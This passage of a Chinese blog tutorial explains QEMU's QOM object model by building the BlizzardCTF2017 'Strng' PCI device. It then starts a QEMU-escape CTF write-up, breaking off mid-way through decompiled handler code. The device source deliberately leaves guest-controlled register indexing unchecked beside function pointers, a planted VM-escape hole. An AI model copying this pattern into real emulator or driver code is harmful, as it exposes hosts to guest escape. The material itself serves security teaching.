<h3 id="类的创建与释放"><a href="#类的创建与释放" class="headerlink" title="类的创建与释放"></a>类的创建与释放</h3><p>类似于在 C++ 当中使用 <code>new</code> 与 <code>delete</code> 来创建与释放一个类实例，在 QOM 中我们应当使用 <code>object_new()</code> 与 <code>object_delete()</code> 来创建与销毁一个 QOM 类实例，本质上就是 <code>分配/释放类空间 + 显示调用构造/析构函数</code></p>
<p>QOM 判断创建类实例的类型是通过类的名字，即 <code>TypeInfo-&gt;name</code>，当创建类实例时 Qemu 会遍历所有的 TypeInfo 并寻找名字匹配的那个，从而调用到对应的构造函数，并将其基类 <code>Object-&gt;class</code> 指向对应的 class</p>
<p>下面是一个示例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// create a QOM object</span></span><br><span class="line">myObject *myobj = object_new(<span class="string">&quot;my_type&quot;</span>);</span><br><span class="line"><span class="comment">// delete a QOM object</span></span><br><span class="line">object_delete(myobj);</span><br></pre></td></tr></table></figure>
<hr>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-05-02_212637.png" alt=""></p>
<h2 id="QOM实例"><a href="#QOM实例" class="headerlink" title="QOM实例"></a>QOM实例</h2><h3 id="Object与Class"><a href="#Object与Class" class="headerlink" title="Object与Class"></a>Object与Class</h3><p>这里以接下来要做的例题Strng为例,看看具体如何使用QOM写就一个PCI设备</p>
<p>首先是一个类的动态数据也就是<strong>Object部分</strong>,因为创建的是PCI设备,所以选择父类为PCIDevice</p>
<p>这里声明了两块内存<code>mmio</code>何<code>pmio</code>,以及几个寄存器</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    PCIDevice pdev;</span><br><span class="line">    MemoryRegion mmio;</span><br><span class="line">    MemoryRegion pmio;</span><br><span class="line">    <span class="type">uint32_t</span> addr;</span><br><span class="line">    <span class="type">uint32_t</span> regs[STRNG_MMIO_REGS];</span><br><span class="line">    <span class="type">void</span> (*srand)(<span class="type">unsigned</span> <span class="type">int</span> seed);</span><br><span class="line">    <span class="type">int</span> (*rand)(<span class="type">void</span>);</span><br><span class="line">    <span class="type">int</span> (*rand_r)(<span class="type">unsigned</span> <span class="type">int</span> *seed);</span><br><span class="line">&#125; STRNGState;</span><br></pre></td></tr></table></figure>
<p>之后是<strong>Class部分</strong>,本题没有定义直接使用PCIDeviceClass</p>
<p>不过也有不少题目会选择创建一个空的class模板,例如</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">STRNGClass</span> &#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    PCIDeviceClass parent;</span><br><span class="line">&#125; STRNGClass;</span><br></pre></td></tr></table></figure>
<p>然后还有将父类转为子类的宏，因为 QOM 基本函数传递的大都是父类指针，所以我们需要一个宏来进行类型检查 + 转型，这也是 Qemu 中惯用的做法：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> STRNG(obj) OBJECT_CHECK(STRNGState, obj, <span class="string">&quot;strng&quot;</span>)</span></span><br></pre></td></tr></table></figure>
<h3 id="mmio-pmio读写函数"><a href="#mmio-pmio读写函数" class="headerlink" title="mmio/pmio读写函数"></a>mmio/pmio读写函数</h3><p>下面我们开始定义 MMIO 与 PMIO 的操作函数，并声明上两个 MemoryRegion 对应的函数表，需要注意的是这里传入的 <strong><code>hwaddr</code> 类型参数其实为相对地址而非绝对地址：</strong></p>
<p><strong>mmio</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">uint64_t</span> <span class="title function_">strng_mmio_read</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    STRNGState *strng = opaque;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size != <span class="number">4</span> || addr &amp; <span class="number">3</span>)</span><br><span class="line">        <span class="keyword">return</span> ~<span class="number">0ULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> strng-&gt;regs[addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">strng_mmio_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    STRNGState *strng = opaque;</span><br><span class="line">    <span class="type">uint32_t</span> saddr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size != <span class="number">4</span> || addr &amp; <span class="number">3</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    saddr = addr &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">switch</span> (saddr) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        strng-&gt;srand(val);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        strng-&gt;regs[saddr] = strng-&gt;rand();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        strng-&gt;regs[saddr] = strng-&gt;rand_r(&amp;strng-&gt;regs[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        strng-&gt;regs[saddr] = val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> MemoryRegionOps strng_mmio_ops = &#123;</span><br><span class="line">    .read = strng_mmio_read,</span><br><span class="line">    .write = strng_mmio_write,</span><br><span class="line">    .endianness = DEVICE_NATIVE_ENDIAN,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>pmio</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">uint64_t</span> <span class="title function_">strng_pmio_read</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    STRNGState *strng = opaque;</span><br><span class="line">    <span class="type">uint64_t</span> val = ~<span class="number">0ULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size != <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (addr) &#123;</span><br><span class="line">    <span class="keyword">case</span> STRNG_PMIO_ADDR:</span><br><span class="line">        val = strng-&gt;addr;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> STRNG_PMIO_DATA:</span><br><span class="line">        <span class="keyword">if</span> (strng-&gt;addr &amp; <span class="number">3</span>)</span><br><span class="line">            <span class="keyword">return</span> val;</span><br><span class="line"></span><br><span class="line">        val = strng-&gt;regs[strng-&gt;addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">strng_pmio_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    STRNGState *strng = opaque;</span><br><span class="line">    <span class="type">uint32_t</span> saddr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size != <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (addr) &#123;</span><br><span class="line">    <span class="keyword">case</span> STRNG_PMIO_ADDR:</span><br><span class="line">        strng-&gt;addr = val;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> STRNG_PMIO_DATA:</span><br><span class="line">        <span class="keyword">if</span> (strng-&gt;addr &amp; <span class="number">3</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        saddr = strng-&gt;addr &gt;&gt; <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">switch</span> (saddr) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            strng-&gt;srand(val);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            strng-&gt;regs[saddr] = strng-&gt;rand();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            strng-&gt;regs[saddr] = strng-&gt;rand_r(&amp;strng-&gt;regs[<span class="number">2</span>]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            strng-&gt;regs[saddr] = val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> MemoryRegionOps strng_pmio_ops = &#123;</span><br><span class="line">    .read = strng_pmio_read,</span><br><span class="line">    .write = strng_pmio_write,</span><br><span class="line">    .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="初始化函数"><a href="#初始化函数" class="headerlink" title="初始化函数"></a>初始化函数</h3><p>然后是<strong>设备实例的初始化函数</strong>，在 <code>PCIDeviceClass</code> 当中定义了一个名为 <code>realize</code> 的函数指针，当 PCI 设备被载入时便会调用这个函数指针指向的函数来初始化</p>
<p>这里我们也定义一个自己的初始化函数，不过我们需要做的工作其实基本上就只有初始化两个 <code>MemoryRegion</code>，<code>memory_region_init_io()</code> 会为这两个 <code>MemoryRegion</code> 进行初始化的工作，并设置函数表为我们指定的函数表，<code>pci_register_bar()</code> 则用来注册 BAR:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_strng_realize</span><span class="params">(PCIDevice *pdev, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    STRNGState *strng = DO_UPCAST(STRNGState, pdev, pdev);</span><br><span class="line"></span><br><span class="line">    memory_region_init_io(&amp;strng-&gt;mmio, OBJECT(strng), &amp;strng_mmio_ops, strng, <span class="string">&quot;strng-mmio&quot;</span>, STRNG_MMIO_SIZE);</span><br><span class="line">    pci_register_bar(pdev, <span class="number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;strng-&gt;mmio);</span><br><span class="line">    memory_region_init_io(&amp;strng-&gt;pmio, OBJECT(strng), &amp;strng_pmio_ops, strng, <span class="string">&quot;strng-pmio&quot;</span>, STRNG_PMIO_SIZE);</span><br><span class="line">    pci_register_bar(pdev, <span class="number">1</span>, PCI_BASE_ADDRESS_SPACE_IO, &amp;strng-&gt;pmio);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后是 Class 与 Object（也就是 instance）的初始化函数，这里需要注意的是在 Class 的初始化函数中我们应当设置父类 <code>PCIDeviceClass</code> 的一系列基本属性（也就是 PCI 设备的基本属性）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">strng_instance_init</span><span class="params">(Object *obj)</span></span><br><span class="line">&#123;</span><br><span class="line">    STRNGState *strng = STRNG(obj);</span><br><span class="line"></span><br><span class="line">    strng-&gt;srand = srand;</span><br><span class="line">    strng-&gt;rand = rand;</span><br><span class="line">    strng-&gt;rand_r = rand_r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">strng_class_init</span><span class="params">(ObjectClass *class, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    PCIDeviceClass *k = PCI_DEVICE_CLASS(class);</span><br><span class="line"></span><br><span class="line">    k-&gt;realize = pci_strng_realize;</span><br><span class="line">    k-&gt;vendor_id = PCI_VENDOR_ID_QEMU;</span><br><span class="line">    k-&gt;device_id = <span class="number">0x11e9</span>;</span><br><span class="line">    k-&gt;revision = <span class="number">0x10</span>;</span><br><span class="line">    k-&gt;class_id = PCI_CLASS_OTHERS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h3><p>最最最后就是为我们的 PCI 设备类型注册 TypeInfo </p>
<p>有时候需要接口中增加PCI 的接口:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_strng_register_types</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> TypeInfo strng_info = &#123;</span><br><span class="line">        .name          = <span class="string">&quot;strng&quot;</span>,</span><br><span class="line">        .parent        = TYPE_PCI_DEVICE,</span><br><span class="line">        .instance_size = <span class="keyword">sizeof</span>(STRNGState),</span><br><span class="line">        .instance_init = strng_instance_init,</span><br><span class="line">        .class_init    = strng_class_init,</span><br><span class="line"> <span class="comment">/*     .interfaces = (InterfaceInfo[]) &#123;</span></span><br><span class="line"><span class="comment">        &#123; INTERFACE_CONVENTIONAL_PCI_DEVICE &#125;,</span></span><br><span class="line"><span class="comment">        &#123; &#125;,</span></span><br><span class="line"><span class="comment">    &#125;,   */</span></span><br><span class="line">    &#125;;</span><br><span class="line">    type_register_static(&amp;strng_info);</span><br><span class="line">&#125;</span><br><span class="line">type_init(pci_strng_register_types)</span><br></pre></td></tr></table></figure>
<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>将编写好的源码放置于<code>hw/misc/a3dev.c</code>目录</p>
<p>在 meson 构建系统中加入我们新增的这个设备，在 <code>hw/misc/meson.build</code> 中加入如下语句：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">softmmu_ss.add(when: <span class="string">&#x27;CONFIG_PCI_STRNG&#x27;</span>, if_true: files(<span class="string">&#x27;strng.c&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>并在 <code>hw/misc/Kconfig</code> 中添加如下内容，这表示我们的设备会在 <code>CONFIG_PCI_DEVICES=y</code> 时编译：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config PCI_STRNG</span><br><span class="line">    <span class="type">bool</span></span><br><span class="line">    <span class="keyword">default</span> y <span class="keyword">if</span> PCI_DEVICES</span><br><span class="line">    depends on PCI</span><br></pre></td></tr></table></figure>
<p>之后编译 Qemu 并附加上 <code>-device strng</code> ，之后随便起一个 Linux 系统，此时使用 <code>lspci</code> 指令我们便能看到我们新添加的 pci 设备：</p>
<h1 id="QEMU逃逸"><a href="#QEMU逃逸" class="headerlink" title="QEMU逃逸"></a>QEMU逃逸</h1><p>QEMU 逃逸本质上和用户态的 Pwn 题没有太大区别，只不过呈现形式略有不同。题目本身通常以一个 QEMU 模拟设备的形式进行呈现，该设备通常会实现一些功能并提供用户可操纵的 MMIO/PMIO 接口。选手通常需要编写一个与这些接口进行交互的程序并传到远程主机上运行以完成利用（类似于内核 Pwn）。</p>
<p>几乎所有的 CTF QEMU Pwn 题都是自定义一个设备并定义相应的 MMIO/PMIO 操作。</p>
<h2 id="BlizzardCTF2017-Strng"><a href="#BlizzardCTF2017-Strng" class="headerlink" title="BlizzardCTF2017 - Strng"></a>BlizzardCTF2017 - Strng</h2><p>题目的源码之前分析过,但实际做题的时候是没给源码的</p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>在启动脚本中发现添加了一个自定义设备</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">./qemu-system-x86_64 \</span><br><span class="line">    -m 1G \</span><br><span class="line">    -device strng \</span><br><span class="line">    -hda my-disk.img \</span><br><span class="line">    -hdb my-seed.img \</span><br><span class="line">    -nographic \</span><br><span class="line">    -L pc-bios/ \</span><br><span class="line">    -enable-kvm \</span><br><span class="line">    -device e1000,netdev=net0 \</span><br><span class="line">    -netdev user,<span class="built_in">id</span>=net0,hostfwd=tcp::5555-:22</span><br></pre></td></tr></table></figure>
<p>ida打开qemu文件,ida加载要有一会,加载符号那里记得选择确定,不然有很多符号会缺失</p>
<p>之后在字符串窗口搜索字符串strng</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.rodata:000000000063E3D8	00000023	C	/home/rcvalle/qemu/hw/misc/strng.c</span><br><span class="line">.rodata:000000000063E3FB	0000000B	C	strng-mmio</span><br><span class="line">.rodata:000000000063E406	0000000B	C	strng-pmio</span><br><span class="line">.rodata:000000000063E411	00000006	C	strng</span><br><span class="line">.rodata:000000000063E420	00000014	C	strng_instance_init</span><br><span class="line">.rodata:000000000063E440	00000011	C	strng_class_init</span><br></pre></td></tr></table></figure>
<p>结合这些信息,可以在函数栏搜索对应函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">pci_strng_realize</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  memory_region_init_io(a1 + <span class="number">2288</span>, a1, strng_mmio_ops, a1, <span class="string">&quot;strng-mmio&quot;</span>, <span class="number">256LL</span>);</span><br><span class="line">  pci_register_bar(a1, <span class="number">0LL</span>, <span class="number">0LL</span>, a1 + <span class="number">2288</span>);</span><br><span class="line">  memory_region_init_io(a1 + <span class="number">2544</span>, a1, strng_pmio_ops, a1, <span class="string">&quot;strng-pmio&quot;</span>, <span class="number">8LL</span>);</span><br><span class="line">  <span class="keyword">return</span> pci_register_bar(a1, <span class="number">1LL</span>, <span class="number">1LL</span>, a1 + <span class="number">2544</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以发现注册了mmio处理与pmio处理</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> __fastcall <span class="title function_">strng_mmio_read</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> &amp;&amp; (addr &amp; <span class="number">3</span>) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">unsigned</span> <span class="type">int</span> *)opaque + (addr &gt;&gt; <span class="number">2</span>) + <span class="number">701</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>opaque</code> 参数其实就是设备加载时动态分配的 <code>PCIDevice</code> 类的一个自定义子类。</p>
<p>在 <code>(u32*)opaque[701]</code> 处存在一个 <code>unsigned int</code> 数组（这里我们称为 <code>opaque-&gt;buf</code>）</p>
<p>MMIO 的 read 主要是简单的读取 <code>opaque-&gt;buf[(addr &gt;&gt; 2)]</code> 上的 4 字节内容，看起来似乎可以存在一个越界读取，但是<strong>在 QEMU 内部会检查 MR 访问范围（addr）是否超过定义的内存范围，所以其实是没法进行越界读取的</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">strng_mmio_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  hwaddr v4; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> vala; <span class="comment">// [rsp+8h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> &amp;&amp; (addr &amp; <span class="number">3</span>) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = addr &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)v4 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *((_DWORD *)opaque + <span class="number">702</span>) = (*((__int64 (__fastcall **)(<span class="type">void</span> *, hwaddr, <span class="type">uint64_t</span>))opaque + <span class="number">384</span>))(opaque, v4, val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( (_DWORD)v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (_DWORD)v4 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        vala = val;</span><br><span class="line">        v5 = (*((__int64 (__fastcall **)(<span class="type">char</span> *))opaque + <span class="number">385</span>))((<span class="type">char</span> *)opaque + <span class="number">2812</span>);</span><br><span class="line">        LODWORD(val) = vala;</span><br><span class="line">        *((_DWORD *)opaque + <span class="number">704</span>) = v5;</span><br><span class="line">      &#125;</span><br><span class="line">      *((_DWORD *)opaque + (<span class="type">unsigned</span> <span class="type">int</span>)v4 + <span class="number">701</span>) = val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      (*((<span class="type">void</span> (__fastcall **)(_QWORD))opaque + <span class="number">383</span>))((<span class="type">unsigned</span> <span class="type">int</span>)val);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>地址为 <code>0</code>：将 <code>(u64*)opaque[383]</code> 处数据作为函数指针进行调用，参数为传入的值</li>
<li>地址为 <code>1 &lt;&lt; 2</code>：将 <code>(u64*)opaque[384]</code> 处数据作为函数指针进行调用，并将结果写入 <code>opaque-&gt;buf[3]</code></li>
<li>地址为 <code>其他值 &lt;&lt; 2</code>：在 <code>opaque-&gt;buf[(addr&gt;&gt;2)]</code> 处写入传入的值</li>
<li>若地址为 <code>3 &lt;&lt; 2</code>，则会在此之前将 <code>(u64*)opaque[385]</code> 处数据作为函数指针进行调用，参数为 <code>&amp;((char*)opaque[2812])</code> ，并往 <code>opaque-&gt;buf[3]</code> 写入传入的值</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> __fastcall <span class="title function_">strng_pmio_read</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  